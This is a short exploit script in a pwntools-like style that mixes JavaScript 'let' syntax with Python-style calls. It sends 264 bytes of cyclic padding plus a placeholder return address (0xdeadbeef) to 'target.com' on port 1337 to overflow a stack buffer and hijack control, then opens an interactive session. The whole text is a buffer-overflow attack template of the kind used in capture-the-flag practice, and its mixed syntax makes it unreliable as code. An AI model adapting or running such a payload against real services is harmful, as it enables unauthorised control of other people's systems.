let offset = 264

let payload = cyclic(offset)

let ret_addr = 0xdeadbeef

payload = payload + p64(ret_addr)

let conn = connect("target.com", 1337)

sendline(conn, "username")
let banner = recvline(conn)
print("Banner:", banner)

send(conn, payload)

let response = recv(conn, 1024)
print("Response:", response)

interactive(conn)
